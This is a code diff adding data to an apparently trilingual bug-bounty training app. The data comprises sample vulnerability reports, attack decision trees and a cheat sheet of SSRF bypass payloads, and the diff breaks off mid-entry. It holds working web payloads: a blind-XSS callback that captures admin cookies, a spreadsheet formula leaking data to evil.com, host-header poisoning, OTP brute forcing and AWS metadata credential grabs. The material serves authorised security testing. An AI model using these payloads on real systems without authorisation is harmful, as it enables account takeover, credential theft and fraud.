@@ -973,7 +973,700 @@ node scripts/import-recon.mjs --help`,
       simple: "Run in your command terminal inside this project folder.",
       hi: "प्रोजेक्ट फोल्डर के टर्मिनल में चलाएं: `node scripts/import-recon.mjs`।",
     },
-    outputExample: "Outputs scope_import.json with deduplicated in-scope hostnames and protocols.",
   },
 ];
+
+// ── 6. READY-TO-SUBMIT BUG REPORT TEMPLATES & ESCALATORS ─────────────────────
+export interface ReportTemplate {
+  id: string;
+  vulnType: string;
+  title: Record<Lang, string>;
+  severity: "Critical (P1)" | "High (P2)" | "Medium (P3)";
+  cvssVector: string;
+  cvssScore: number;
+  escalatorTip: Record<Lang, string>;
+  sampleReport: string;
+}
+
+export const REPORT_TEMPLATES: ReportTemplate[] = [
+  {
+    id: "report-ato-oauth",
+    vulnType: "Account Takeover (OAuth / Open Redirect)",
+    title: {
+      en: "Full Account Takeover via OAuth redirect_uri Validation Bypass & Authorization Code Leakage",
+      simple: "Steal Any User's Account via Social Login Bypass",
+      hi: "OAuth redirect_uri बाईपास और ऑथराइज़ेशन कोड लीकेज से फुल अकाउंट टेकओवर",
+    },
+    severity: "Critical (P1)",
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
+    cvssScore: 9.3,
+    escalatorTip: {
+      en: "Do NOT report just an Open Redirect. Chain it directly to the OAuth /login endpoint where `redirect_uri` allows your open redirect path or subdomain. Prove that the OAuth code is sent in the URL hash/query to the attacker domain. This turns a $0 informative report into a $5,000+ P1 critical payout.",
+      simple: "Don't report open redirect alone. Connect it to social login so the secret login code gets sent to you. That changes $0 into $5,000+.",
+      hi: "सिर्फ ओपन रीडायरेक्ट रिपोर्ट न करें। उसे OAuth लॉगिन के `redirect_uri` में जोड़कर दिखाएं कि विक्टिम का ऑथराइज़ेशन कोड अटैकर सर्वर पर पहुंच रहा है। इससे $0 की रिपोर्ट सीधे $5,000+ P1 में बदल जाती है।",
+    },
+    sampleReport: `**Vulnerability Title:**
+Full Account Takeover via OAuth redirect_uri Validation Bypass & Authorization Code Leakage
+
+**Vulnerability Type:**
+Improper Validation of Specified Type of Input (CWE-1287) / Account Takeover
+
+**Severity:**
+Critical (CVSS 9.3: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)
+
+**Summary:**
+The OAuth 2.0 authorization endpoint at \`https://auth.target.com/oauth/authorize\` improperly validates the \`redirect_uri\` parameter. By leveraging a parameter pollution or subdomain path traversal technique, an attacker can trick the authorization server into sending victim OAuth \`code\` tokens to an attacker-controlled endpoint.
+
+**Steps to Reproduce:**
+1. Log in as an attacker and observe the OAuth authorization flow:
+   \`GET /oauth/authorize?client_id=WEB_APP&response_type=code&redirect_uri=https://target.com/oauth/callback&scope=user:read HTTP/1.1\`
+2. Notice the regex allows arbitrary paths on \`target.com\` or wildcard subdomains.
+3. Combine this with an open redirect at \`https://target.com/logout?next=https://attacker.com\`:
+   \`GET /oauth/authorize?client_id=WEB_APP&response_type=code&redirect_uri=https://target.com/logout%3Fnext%3Dhttps://attacker.com&scope=user:read HTTP/1.1\`
+4. Send the crafted link to a logged-in victim.
+5. As soon as the victim clicks the link, the server redirects them and appends the authorization code to the attacker's server in the query parameters:
+   \`GET https://attacker.com/?code=AUTH_SECRET_CODE_98124\`
+6. The attacker exchanges this code at \`https://auth.target.com/oauth/token\` for a valid victim Bearer token, taking over the victim's account without credentials.
+
+**Impact:**
+Any attacker can completely compromise arbitrary accounts without user interaction beyond clicking a single legitimate-looking target link.
+
+**Remediation:**
+Implement strict whitelist matching for \`redirect_uri\` instead of loose substring or regex matching. Reject any URI containing query parameters or path traversals.`,
+  },
+  {
+    id: "report-idor-tenant",
+    vulnType: "Critical Multi-Tenant IDOR (Data Tampering)",
+    title: {
+      en: "Critical Multi-Tenant IDOR on Invoice API Allowing Modification & Deletion of Foreign Tenant Records",
+      simple: "Modify or Delete Other Company's Invoices without Permission",
+      hi: "मल्टी-टेनेंट IDOR: दूसरी कंपनी के इनवॉइस को बिना अनुमति मॉडिफाई और डिलीट करना",
+    },
+    severity: "Critical (P1)",
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+    cvssScore: 8.8,
+    escalatorTip: {
+      en: "Do NOT stop at reading other users' data with GET (which often gets downgraded to Medium P3). Always test PUT, PATCH, and DELETE. Showing that you can overwrite billing amounts or delete corporate contracts upgrades the severity directly to P1 Critical.",
+      simple: "Don't just view data. Try to edit or delete it with PUT or DELETE requests. Editing or deleting elevates the report to high payout.",
+      hi: "सिर्फ GET से डेटा देखने पर न रुकें (ट्राइएजर इसे Medium P3 मान सकता है)। PUT, PATCH या DELETE टेस्ट करके दिखाएं कि आप दूसरों का डेटा बदल या मिटा सकते हैं। यह तुरंत P1 Critical बन जाता है।",
+    },
+    sampleReport: `**Vulnerability Title:**
+Critical Multi-Tenant IDOR on Invoice API Allowing Modification & Deletion of Foreign Tenant Records
+
+**Vulnerability Type:**
+Insecure Direct Object Reference (IDOR) / Broken Access Control (CWE-639)
+
+**Severity:**
+High / Critical (CVSS 8.8: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
+
+**Summary:**
+The REST API endpoint \`/api/v2/tenants/{tenant_id}/invoices/{invoice_id}\` lacks proper object-level authorization checks. A low-privileged authenticated user from Tenant A can view, edit, and delete billing records belonging to Tenant B by simply substituting the target IDs.
+
+**Steps to Reproduce:**
+1. Create Account A belonging to Tenant A (\`tenant_id: 101\`) and create an invoice (\`invoice_id: 5041\`).
+2. Create Account B belonging to Tenant B (\`tenant_id: 202\`).
+3. Using Account B's JWT token, send a PATCH request modifying Tenant A's invoice:
+   \`\`\`http
+   PATCH /api/v2/tenants/101/invoices/5041 HTTP/1.1
+   Host: api.target.com
+   Authorization: Bearer <ACCOUNT_B_TOKEN>
+   Content-Type: application/json
+
+   {
+     "status": "paid",
+     "amount_due": 0,
+     "payout_recipient": "attacker@evil.com"
+   }
+   \`\`\`
+4. Observe the response \`200 OK\` with the updated invoice.
+5. In Account A's dashboard, verify that the invoice has been unauthorizedly altered.
+
+**Impact:**
+Complete loss of data integrity and confidentiality across multi-tenant boundaries. An attacker can tamper with financial transactions, alter payment recipients, or wipe out historical records across the enterprise.
+
+**Remediation:**
+Enforce database-level tenant isolation (e.g. \`WHERE tenant_id = current_user.tenant_id AND id = :invoice_id\`) rather than trusting client-provided tenant IDs.`,
+  },
+  {
+    id: "report-ssrf-cloud",
+    vulnType: "SSRF to Cloud Metadata (AWS/GCP)",
+    title: {
+      en: "Server-Side Request Forgery (SSRF) via Webhook Validation Endpoint Leading to AWS IAM Role Credential Extraction",
+      simple: "SSRF to Steal Cloud Server Secret Keys",
+      hi: "वेबहुक वैलिडेशन में SSRF द्वारा AWS IAM रोल्स और क्लाउड क्रेडेंशियल्स की चोरी",
+    },
+    severity: "Critical (P1)",
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+    cvssScore: 9.3,
+    escalatorTip: {
+      en: "Do NOT just show a DNS hit on Burp Collaborator. A Collaborator ping without internal data is usually marked P4/Informative. Query http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name> and redact the secret key in your screenshot. Proving IAM credential exposure turns this into a maximum critical payout ($10,000+).",
+      simple: "Don't just ping your server. Query the internal cloud IP (169.254.169.254) and show the AWS IAM role name. That proves total server compromise.",
+      hi: "सिर्फ Collaborator पर पिंग न दिखाएं। इंटरनल क्लाउड IP `169.254.169.254` को क्वेरी करके IAM रोल का नाम और क्रेडेंशियल का स्क्रीनशॉट दें (सीक्रेट की को ब्लर करें)। यह 100% P1 कन्फर्म करता है।",
+    },
+    sampleReport: `**Vulnerability Title:**
+Server-Side Request Forgery (SSRF) via Webhook Validation Endpoint Leading to AWS IAM Role Credential Extraction
+
+**Vulnerability Type:**
+Server-Side Request Forgery (SSRF) (CWE-918)
+
+**Severity:**
+Critical (CVSS 9.3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)
+
+**Summary:**
+The webhook testing functionality at \`POST /api/webhooks/test\` permits arbitrary URL fetching without filtering local link-local addresses. An attacker can query the AWS EC2 instance metadata service (IMDS) and extract temporary IAM security credentials assigned to the worker node.
+
+**Steps to Reproduce:**
+1. Navigate to Settings -> Webhooks -> Test Endpoint.
+2. Submit the following payload in the webhook test field:
+   \`\`\`json
+   {
+     "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+   }
+   \`\`\`
+3. The server responds with the attached IAM role name: \`Production-Eks-Worker-Role\`.
+4. Send a follow-up request to fetch the security tokens:
+   \`\`\`json
+   {
+     "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/Production-Eks-Worker-Role"
+   }
+   \`\`\`
+5. Observe the response containing \`AccessKeyId\`, \`SecretAccessKey\`, and \`Token\`.
+
+**Impact:**
+An external attacker can access the company's AWS cloud infrastructure using the extracted IAM credentials, enabling read and write access to internal S3 buckets, RDS databases, and EC2 instances.
+
+**Remediation:**
+1. Require IMDSv2 with token hop limit 1.
+2. Implement a strict egress IP firewall rejecting requests to \`169.254.169.254\`, \`10.0.0.0/8\`, \`172.16.0.0/12\`, and \`192.168.0.0/16\`.`,
+  },
+  {
+    id: "report-race-condition",
+    vulnType: "Race Condition / Business Logic Flaw",
+    title: {
+      en: "Race Condition on Gift Card & Coupon Redemption Allowing Unlimited Balance Multiplication",
+      simple: "Spend the Same Coupon Multiple Times via Rapid Requests",
+      hi: "रेस कंडीशन: एक ही कूपन कोड को एक साथ भुनाकर अनलिमिटेड बैलेंस प्राप्त करना",
+    },
+    severity: "High (P2)",
+    cvssVector: "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N",
+    cvssScore: 7.5,
+    escalatorTip: {
+      en: "Use HTTP/2 Single-Packet Attack in Burp Repeater. Send 20 parallel requests in the exact same TCP packet. Demonstrating that a $50 coupon redeemed 15 times generates $750 in wallet balance proves direct financial loss, guaranteeing high priority triage.",
+      simple: "Send 20 requests at the exact same millisecond using Burp HTTP/2. Show your account balance growing repeatedly.",
+      hi: "Burp Repeater में HTTP/2 Single-Packet Attack का इस्तेमाल करें। एक साथ 20 रिक्वेस्ट भेजकर दिखाएं कि $50 का कूपन 15 बार रिडीम होकर $750 बैलेंस बना देता है। यह डायरेक्ट वित्तीय नुकसान साबित करता है।",
+    },
+    sampleReport: `**Vulnerability Title:**
+Race Condition on Gift Card & Coupon Redemption Allowing Unlimited Balance Multiplication
+
+**Vulnerability Type:**
+Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') (CWE-362)
+
+**Severity:**
+High (CVSS 7.5: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N)
+
+**Summary:**
+The promotional coupon redemption endpoint at \`POST /api/wallet/redeem\` does not implement database-level row locking. By sending concurrent requests in a single TCP window, an attacker can bypass the single-use coupon restriction and redeem the coupon multiple times simultaneously.
+
+**Steps to Reproduce:**
+1. Obtain a valid single-use promotional coupon code (e.g. \`SAVE50\` for $50 credit).
+2. Intercept the redemption request in Burp Suite:
+   \`\`\`http
+   POST /api/wallet/redeem HTTP/2
+   Host: target.com
+   Authorization: Bearer <USER_TOKEN>
+   Content-Type: application/json
+
+   {"code": "SAVE50"}
+   \`\`\`
+3. Send to Burp Repeater and create a tab group with 20 copies of this request.
+4. Select "Send group in parallel (single-packet attack)".
+5. Observe that 14 out of 20 requests return \`200 OK: Coupon redeemed successfully\`.
+6. Refresh the account wallet: balance reflects $700 instead of the allowed $50.
+
+**Impact:**
+Direct financial loss for the platform through unauthorized balance generation and fraud.
+
+**Remediation:**
+Wrap the coupon validation and balance update in an atomic database transaction with pessimistic locking (\`SELECT ... FOR UPDATE\`) or utilize an atomic Redis token consumption pattern.`,
+  },
+  {
+    id: "report-blind-xss",
+    vulnType: "Blind / Stored XSS to Admin Portal",
+    title: {
+      en: "Blind Stored XSS in Support Ticket System Leading to Internal Admin Session Hijacking",
+      simple: "XSS that Triggers Inside the Employee / Admin Dashboard",
+      hi: "सपोर्ट टिकट में ब्लाइंड स्टोर्ड XSS द्वारा एडमिन सेशन की हाईजैकिंग",
+    },
+    severity: "High (P2)",
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N",
+    cvssScore: 8.2,
+    escalatorTip: {
+      en: "Do NOT just submit `<script>alert(1)</script>`. Use an XSS Hunter / bxss payload that fires on the admin portal. When the admin opens the ticket, collect the admin's internal URL, IP, DOM screenshot, and cookies. Proving access to the internal backoffice portal elevates this to P1/P2.",
+      simple: "Use an XSS Hunter payload that logs the admin's screen and internal URL when they view your ticket.",
+      hi: "सिर्फ `alert(1)` न भेजें। XSS Hunter पेलोड का इस्तेमाल करें जो एडमिन के पोर्टल खोलते ही उनका इंटरनल URL, IP और स्क्रीनशॉट कैप्चर कर ले। इससे इंटरनल बैकऑफिस एक्सेस साबित होता है।",
+    },
+    sampleReport: `**Vulnerability Title:**
+Blind Stored XSS in Support Ticket System Leading to Internal Admin Session Hijacking
+
+**Vulnerability Type:**
+Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (CWE-79)
+
+**Severity:**
+High / Critical (CVSS 8.2: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N)
+
+**Summary:**
+The support ticket submission form at \`POST /api/support/tickets\` fails to sanitize user-supplied HTML entities in the \`subject\` and \`message\` parameters. When an internal support administrator views the ticket in their private backoffice dashboard (\`https://admin-internal.target.com\`), the script executes in the context of the privileged admin session.
+
+**Steps to Reproduce:**
+1. Navigate to the contact support form as a normal user.
+2. Submit a ticket with the following payload in the subject line:
+   \`\`\`html
+   "><script src="https://yourname.xss.ht"></script>
+   \`\`\`
+3. Wait for the ticket to be triaged by customer support staff.
+4. Check your XSS callback logs: a hit is received from \`https://internal-desk.target.internal/tickets/view?id=9021\`.
+5. The callback report captures the full DOM, admin cookies, and local session tokens.
+
+**Impact:**
+Arbitrary script execution inside the internal corporate portal. An attacker can perform administrative actions, access customer PII, or pivot deeper into internal systems.
+
+**Remediation:**
+Implement context-aware HTML entity encoding on output within the admin portal and configure a restrictive Content-Security-Policy (CSP) that disallows unsafe-inline and untrusted script sources.`,
+  },
+];
+
+// ── 7. VISUAL ATTACK DECISION TREES ("Agar yeh dikhe toh kya karein?") ────────
+export interface DecisionTreeNode {
+  condition: Record<Lang, string>;
+  action: Record<Lang, string>;
+  payloadOrCommand?: string;
+  positiveIndicator: Record<Lang, string>;
+  payoutImpact: string;
+}
+
+export interface AttackDecisionTree {
+  id: string;
+  featureName: Record<Lang, string>;
+  emoji: string;
+  triggerContext: Record<Lang, string>;
+  steps: DecisionTreeNode[];
+}
+
+export const ATTACK_DECISION_TREES: AttackDecisionTree[] = [
+  {
+    id: "tree-password-reset",
+    featureName: {
+      en: "Password Reset & 2FA Flow",
+      simple: "Forgot Password & OTP Features",
+      hi: "पासवर्ड रीसेट और 2FA फ़्लो",
+    },
+    emoji: "🔐",
+    triggerContext: {
+      en: "Whenever you encounter a 'Forgot Password', 'Verify Email', or 'SMS OTP' screen.",
+      simple: "Any page where a user requests a code or link to reset password.",
+      hi: "जब भी आपको 'Forgot Password', 'Email Verification' या 'SMS OTP' स्क्रीन दिखे।",
+    },
+    steps: [
+      {
+        condition: {
+          en: "Password reset sends an email with a reset link",
+          simple: "Website sends reset link to your email",
+          hi: "वेबसाइट रीसेट लिंक ईमेल पर भेजती है",
+        },
+        action: {
+          en: "Intercept request in Burp and inject `Host: evil.com` and `X-Forwarded-Host: evil.com` headers.",
+          simple: "Change Host header in Burp to evil.com.",
+          hi: "Burp में रिक्वेस्ट रोकें और `Host: evil.com` तथा `X-Forwarded-Host: evil.com` हेडर जोड़ें।",
+        },
+        payloadOrCommand: `POST /api/auth/forgot-password HTTP/1.1\nHost: evil.com\nX-Forwarded-Host: evil.com\n\n{"email": "victim@target.com"}`,
+        positiveIndicator: {
+          en: "Email arrives with reset link pointing to `evil.com/reset?token=XYZ` (Password Reset Poisoning).",
+          simple: "The email has link with evil.com in it.",
+          hi: "ईमेल में रीसेट लिंक `evil.com/reset?token=XYZ` बनकर आता है (हॉस्ट हेडर प्वाइज़निंग)।",
+        },
+        payoutImpact: "P1 Critical ($3,000 – $10,000)",
+      },
+      {
+        condition: {
+          en: "Verification requires a 4-digit or 6-digit OTP code",
+          simple: "Site asks for 4 or 6 digit number",
+          hi: "वेरिफिकेशन के लिए 4 या 6 डिजिट का OTP मांगा जाता है",
+        },
+        action: {
+          en: "Test rate limit on `/api/verify-otp`. Send 1,000 rapid guesses via Turbo Intruder or Burp Intruder.",
+          simple: "Send 1,000 OTP guesses fast to test if it blocks you.",
+          hi: "Burp Intruder या Turbo Intruder से 1,000 OTP तेजी से भेजकर रेट-लिमिट चेक करें।",
+        },
+        payloadOrCommand: `// Turbo Intruder Python snippet:\nfor i in range(10000):\n    engine.queue(target.req, [str(i).zfill(4)])`,
+        positiveIndicator: {
+          en: "No 429 Too Many Requests status or CAPTCHA trigger after 500+ attempts; correct code resets password.",
+          simple: "Server doesn't block you after 100+ attempts.",
+          hi: "500+ रिक्वेस्ट के बाद भी 429 ब्लॉक या CAPTCHA नहीं आता; सही OTP मिलने पर पासवर्ड रीसेट हो जाता है।",
+        },
+        payoutImpact: "P1 Critical ($2,500 – $6,000)",
+      },
+      {
+        condition: {
+          en: "Client-side validates OTP response",
+          simple: "Browser checks if OTP is right or wrong",
+          hi: "ब्राउज़र खुद चेक करता है कि OTP सही है या गलत",
+        },
+        action: {
+          en: "Intercept the server response in Burp Proxy (`Do intercept -> Response to this request`) on a wrong OTP.",
+          simple: "Intercept response of wrong OTP and edit error to success.",
+          hi: "गलत OTP भेजकर Burp में सर्वर का Response इंटरसेप्ट करें।",
+        },
+        payloadOrCommand: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"success": true, "verified": true, "token": "temp_token"}`,
+        positiveIndicator: {
+          en: "UI advances to 'Enter New Password' step and successfully saves the new password on the server.",
+          simple: "Website lets you type a new password even with wrong code.",
+          hi: "UI सीधे 'New Password' स्क्रीन पर ले जाता है और नया पासवर्ड सेव हो जाता है (रिस्पॉन्स मैनिपुलेशन)।",
+        },
+        payoutImpact: "P1 Critical ($3,000 – $8,000)",
+      },
+    ],
+  },
+  {
+    id: "tree-file-upload",
+    featureName: {
+      en: "File & Avatar Upload Endpoint",
+      simple: "Upload Profile Picture / Document",
+      hi: "फ़ाइल और प्रोफाइल फोटो अपलोड एंडपॉइंट",
+    },
+    emoji: "📁",
+    triggerContext: {
+      en: "Any place where users can upload an avatar, resume, invoice PDF, or CSV file.",
+      simple: "Any button that lets you pick a file from your computer.",
+      hi: "जहाँ भी प्रोफाइल फोटो, रिज्यूमे, इनवॉइस या CSV फ़ाइल अपलोड करने का ऑप्शन हो।",
+    },
+    steps: [
+      {
+        condition: {
+          en: "System accepts image formats (PNG, JPG, SVG)",
+          simple: "Upload accepts SVG image",
+          hi: "सिस्टम इमेज फ़ाइल्स (PNG, JPG, SVG) स्वीकार करता है",
+        },
+        action: {
+          en: "Upload an SVG file containing JavaScript inside `<svg><script>alert(document.domain)</script></svg>`.",
+          simple: "Upload SVG file with script inside it.",
+          hi: "JavaScript युक्त SVG फ़ाइल अपलोड करें।",
+        },
+        payloadOrCommand: `<?xml version="1.0" standalone="no"?>\n<svg xmlns="http://www.w3.org/2000/svg">\n  <script>alert(document.domain)</script>\n</svg>`,
+        positiveIndicator: {
+          en: "Direct link to image executes JavaScript in browser on main target domain.",
+          simple: "Opening uploaded picture URL shows popup alert.",
+          hi: "अपलोड की गई इमेज के डायरेक्ट लिंक पर क्लिक करने पर ब्राउज़र में अलर्ट रन होता है।",
+        },
+        payoutImpact: "P2 High ($1,000 – $3,500)",
+      },
+      {
+        condition: {
+          en: "Upload filename is reflected on server or stored in local disk",
+          simple: "Site saves file with its original name",
+          hi: "सर्वर फ़ाइल को उसके ओरिजिनल नाम से डिस्क पर सेव करता है",
+        },
+        action: {
+          en: "Test Path Traversal in the `filename` parameter using `../../../../var/www/shell.png`.",
+          simple: "Change filename to ../../shell.php in Burp.",
+          hi: "Burp में `filename` पैरामीटर में `../../../../tmp/test` लगाकर पाथ ट्रैवर्सल टेस्ट करें।",
+        },
+        payloadOrCommand: `Content-Disposition: form-data; name="file"; filename="../../../../var/www/html/test.txt"\nContent-Type: text/plain\n\ntest_payload`,
+        positiveIndicator: {
+          en: "File is written outside the intended upload directory, accessible at root path.",
+          simple: "File gets placed in different server folder.",
+          hi: "फ़ाइल अपलोड फोल्डर से बाहर सर्वर रूट या मनचाहे पाथ पर सेव हो जाती है।",
+        },
+        payoutImpact: "P1 Critical ($3,500 – $10,000)",
+      },
+      {
+        condition: {
+          en: "Site parses Excel/CSV files (e.g. bulk contact or inventory import)",
+          simple: "Site imports CSV or Excel files",
+          hi: "साइट CSV या Excel फ़ाइल इम्पोर्ट करती है",
+        },
+        action: {
+          en: "Inject CSV Injection / Formula Injection commands starting with `=`, `@`, or `+`.",
+          simple: "Put Excel formula inside the spreadsheet.",
+          hi: "CSV की किसी सेल में formula injection `=cmd|' /C calc'!A0` या `=HYPERLINK()` डालें।",
+        },
+        payloadOrCommand: `=HYPERLINK("http://evil.com/leak?d="&A1, "Click for Report")`,
+        positiveIndicator: {
+          en: "Admin downloading the exported sheet executes malicious formula or leaks cell data via HTTP request.",
+          simple: "Spreadsheet executes formula when opened by staff.",
+          hi: "शीट डाउनलोड करने पर एडमिन के सिस्टम पर फ़ॉर्मूला एग्जीक्यूट होता है या डेटा लीक होता है।",
+        },
+        payoutImpact: "P3/P2 ($500 – $2,000)",
+      },
+    ],
+  },
+  {
+    id: "tree-graphql",
+    featureName: {
+      en: "GraphQL Endpoint (/graphql)",
+      simple: "GraphQL APIs",
+      hi: "ग्राफ़-QL एंडपॉइंट्स (/graphql)",
+    },
+    emoji: "🕸️",
+    triggerContext: {
+      en: "Whenever network traffic sends requests to `/graphql`, `/api/graphql`, or `query { ... }` syntax.",
+      simple: "Any web request that has 'query' or 'mutation' inside it.",
+      hi: "जब भी नेटवर्क ट्रैफिक में `/graphql` एंडपॉइंट या `query { ... }` सिंटैक्स दिखे।",
+    },
+    steps: [
+      {
+        condition: {
+          en: "GraphQL endpoint is reachable",
+          simple: "GraphQL is available",
+          hi: "GraphQL एंडपॉइंट चालू है",
+        },
+        action: {
+          en: "Send an introspection query to dump the entire database schema, queries, and hidden mutations.",
+          simple: "Ask GraphQL to send you the entire internal database map.",
+          hi: "इंट्रोस्पेक्शन क्वेरी भेजकर पूरा स्कीमा, प्राइवेट क्वेरीज़ और म्यूटेशन्स डंप करें।",
+        },
+        payloadOrCommand: `POST /graphql HTTP/1.1\nContent-Type: application/json\n\n{"query": "{__schema{types{name,fields{name,args{name}}}}}"}`,
+        positiveIndicator: {
+          en: "Response returns full schema with internal admin mutations like `deleteUser`, `updateRole`, `debugLog`.",
+          simple: "Server responds with huge list of all secret queries and admin functions.",
+          hi: "रिस्पॉन्स में सारे प्राइवेट म्यूटेशन्स जैसे `updateUserRole`, `adminResetPassword` साफ दिखाई देते हैं।",
+        },
+        payoutImpact: "P3 Info / Stepping Stone to P1",
+      },
+      {
+        condition: {
+          en: "Introspection is disabled by developer",
+          simple: "Introspection is blocked",
+          hi: "डेवलपर ने इंट्रोस्पेक्शन बंद कर रखा है",
+        },
+        action: {
+          en: "Use GraphQL Field Suggestion brute-forcing via `clairvoyance` tool to reconstruct the schema blindly.",
+          simple: "Use clairvoyance tool to guess field names one by one.",
+          hi: "`clairvoyance` टूल से फ़ील्ड सजेशन एरर्स का इस्तेमाल करके पूरा स्कीमा ब्लाइंडली रीकन्स्ट्रक्ट करें।",
+        },
+        payloadOrCommand: `clairvoyance -o schema.json https://target.com/graphql`,
+        positiveIndicator: {
+          en: "Tool reconstructs types from server hints like: 'Did you mean user or userProfile?'.",
+          simple: "Tool guesses all endpoints from error messages.",
+          hi: "सर्वर के एरर हिंट्स से टूल पूरा स्कीमा तैयार कर देता है।",
+        },
+        payoutImpact: "P2/P1 Pathway ($1,500 – $5,000)",
+      },
+      {
+        condition: {
+          en: "Query batching is supported (array of queries)",
+          simple: "Server accepts multiple queries at once",
+          hi: "सर्वर एक साथ कई क्वेरीज़ की ऐरे स्वीकार करता है",
+        },
+        action: {
+          en: "Bypass rate limits by packing 100 OTP/password attempts in a single JSON array `[{query:...}, {query:...}]`.",
+          simple: "Send 100 login attempts in one single request.",
+          hi: "एक ही JSON ऐरे में 100 क्वेरीज़ डालकर रेट-लिमिट बाईपास करें।",
+        },
+        payloadOrCommand: `[{"query":"mutation{login(user:\\"admin\\",pass:\\"1234\\"){token}}"},{"query":"mutation{login(user:\\"admin\\",pass:\\"1235\\"){token}}"}]`,
+        positiveIndicator: {
+          en: "Server processes all 100 mutations in 1 single HTTP request without triggering rate limits.",
+          simple: "Server tests all passwords in one click without blocking.",
+          hi: "सर्वर बिना किसी रेट-लिमिट के एक ही HTTP रिक्वेस्ट में 100 म्यूटेशन्स प्रोसेस कर देता है।",
+        },
+        payoutImpact: "P2 High ($2,000 – $5,000)",
+      },
+    ],
+  },
+  {
+    id: "tree-checkout",
+    featureName: {
+      en: "Payment, Cart & Checkout Flows",
+      simple: "Online Shopping & Checkout",
+      hi: "पेमेंट, कार्ट और चेकआउट फ़्लो",
+    },
+    emoji: "💳",
+    triggerContext: {
+      en: "E-commerce carts, premium subscription upgrades, credit purchases, or token balances.",
+      simple: "Any screen where money or coins are paid.",
+      hi: "जहाँ भी ऑनलाइन पेमेंट, प्रीमियम प्लान, वॉलेट बैलेंस या शॉपिंग कार्ट हो।",
+    },
+    steps: [
+      {
+        condition: {
+          en: "User selects item quantity in cart",
+          simple: "Cart has number of items",
+          hi: "कार्ट में आइटम की मात्रा (quantity) चुनी जाती है",
+        },
+        action: {
+          en: "Intercept request in Burp and change `quantity` to `-1`, `0`, or `0.01`.",
+          simple: "Change quantity to negative number like -1.",
+          hi: "Burp में `quantity` को बदलकर `-1`, `0` या `0.001` करके भेजें।",
+        },
+        payloadOrCommand: `POST /api/cart/update HTTP/1.1\n\n{"item_id": 99, "quantity": -1, "price": 100}`,
+        positiveIndicator: {
+          en: "Total cart sum becomes negative or drops to $0, allowing free checkout or crediting money to account.",
+          simple: "Cart total becomes $0 or negative.",
+          hi: "कार्ट का कुल योग $0 या नेगेटिव हो जाता है और फ्री में ऑर्डर प्लेस हो जाता है।",
+        },
+        payoutImpact: "P1 Critical ($3,000 – $10,000)",
+      },
+      {
+        condition: {
+          en: "Payment gateway supports multiple currencies (USD, INR, JPY)",
+          simple: "Store supports different currencies",
+          hi: "पेमेंट गेटवे में अलग-अलग करेंसी (USD, INR, JPY) सपोर्टेड हैं",
+        },
+        action: {
+          en: "Add an item in USD ($100), tamper currency code to JPY (Japanese Yen has no decimals, ¥100 ≈ $0.65).",
+          simple: "Change currency from USD to JPY in Burp.",
+          hi: "करेंसी को USD से बदलकर JPY करें (¥100 की कीमत $1 से भी कम होती है)।",
+        },
+        payloadOrCommand: `POST /api/checkout/pay HTTP/1.1\n\n{"order_id": 881, "amount": 100, "currency": "JPY"}`,
+        positiveIndicator: {
+          en: "Order for a $100 product is completed by charging only 100 Yen ($0.65).",
+          simple: "You get a $100 product for less than $1.",
+          hi: "$100 का प्रोडक्ट सिर्फ 100 येन (लगभग ₹55) में प्रोसेस हो जाता है (करेंसी आर्बिट्रेज)।",
+        },
+        payoutImpact: "P1 Critical ($2,500 – $7,500)",
+      },
+    ],
+  },
+];
+
+// ── 8. HIGH-YIELD PAYLOADS & BYPASS CHEATSHEET ──────────────────────────────
+export interface HighYieldPayload {
+  id: string;
+  category: "ssrf" | "xss" | "sqli" | "ssti" | "redirect";
+  name: Record<Lang, string>;
+  targetEnv: string;
+  payload: string;
+  whyItBypasses: Record<Lang, string>;
+}
+
+export const HIGH_YIELD_PAYLOADS: HighYieldPayload[] = [
+  {
+    id: "ssrf-aws-ipv6",
+    category: "ssrf",
+    name: {
+      en: "AWS IMDSv1 IPv6 Link-Local Bypass",
+      simple: "AWS Metadata IPv6 Bypass",
+      hi: "AWS मेटाडेटा IPv6 लिंक-लोकल बाईपास",
+    },
+    targetEnv: "AWS EC2 / EKS with IPv6 enabled",
+    payload: "http://[fd00:ec2::254]/latest/meta-data/iam/security-credentials/",
+    whyItBypasses: {
+      en: "Most naive regex filters only check for '169.254.169.254' IPv4 strings and completely ignore the official AWS IPv6 metadata address.",
+      simple: "Websites block 169.254.169.254 but forget AWS has an IPv6 address for the same thing.",
+      hi: "ज्यादातर फ़िल्टर सिर्फ '169.254.169.254' IPv4 ब्लॉक करते हैं और AWS के आधिकारिक IPv6 एड्रेस को भूल जाते हैं।",
+    },
+  },
+  {
+    id: "ssrf-decimal-ip",
+    category: "ssrf",
+    name: {
+      en: "Dword / Decimal IP Representation",
+      simple: "Decimal Number IP Address",
+      hi: "डेसिमल IP रिप्रजेंटेशन (2852039166)",
+    },
+    targetEnv: "Linux / cURL / Python requests",
+    payload: "http://2852039166/latest/meta-data/",
+    whyItBypasses: {
+      en: "2852039166 is the integer equivalent of 169.254.169.254. Linux network sockets automatically translate this without matching string filters.",
+      simple: "The number 2852039166 is actually 169.254.169.254 written as a single integer number.",
+      hi: "2852039166 असल में 169.254.169.254 का इंटीजर रूप है। लिनक्स कर्नल इसे सीधे कन्वर्ट कर लेता है।",
+    },
+  },
+  {
+    id: "ssrf-hex-ip",
+    category: "ssrf",
+    name: {
+      en: "Hexadecimal IP Representation",
+      simple: "Hexadecimal IP Address",
